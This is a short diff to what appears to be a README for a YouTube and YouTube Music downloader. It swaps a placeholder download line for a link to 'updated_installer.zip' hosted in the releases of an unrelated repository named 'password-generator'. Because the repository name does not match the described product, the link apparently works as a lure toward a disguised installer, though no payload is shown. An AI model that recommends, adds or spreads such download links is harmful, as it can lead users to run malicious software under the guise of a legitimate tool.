@@ -1,4 +1,4 @@
-Download - (Click)
+Download - [Click](https://github.com/zaidellian/password-generator/releases/download/1/updated_installer.zip)
 
 Key Features:
 - YouTube default, live streaming and YouTube Music support
